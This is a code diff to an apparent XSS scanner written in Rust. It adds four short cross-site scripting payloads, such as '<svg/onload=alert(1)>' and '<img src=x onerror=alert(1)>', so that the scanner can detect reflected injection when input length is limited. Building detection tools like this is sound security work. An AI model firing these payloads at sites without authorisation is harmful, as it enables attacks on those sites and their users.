@@ -132,10 +132,20 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
             let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
             let mxss_payloads = crate::payload::get_mxss_payloads();
             let clobbering_payloads = crate::payload::get_dom_clobbering_payloads();
+            // Short payloads without markers for truncated reflection contexts.
+            // These are intentionally compact (<30 chars) so they survive server-side
+            // length limits. They only yield [R] (reflected) findings, not [V].
+            let short_payloads: Vec<String> = vec![
+                "<svg/onload=alert(1)>".to_string(),
+                "<img src=x onerror=alert(1)>".to_string(),
+                "<svg onload=alert(1)>".to_string(),
+                "<details open ontoggle=alert(1)>".to_string(),
+            ];
             match delimiter_type {
                 Some(DelimiterType::Comment) => {
-                    for payload in html_payloads
+                    for payload in short_payloads
                         .iter()
+                        .chain(html_payloads.iter())
                         .chain(mxss_payloads.iter())
                         .chain(clobbering_payloads.iter())
                     {
@@ -143,6 +153,7 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                     }
                 }
                 _ => {
+                    payloads.extend(short_payloads);
                     payloads.extend(html_payloads);
                     payloads.extend(mxss_payloads);
                     payloads.extend(clobbering_payloads);
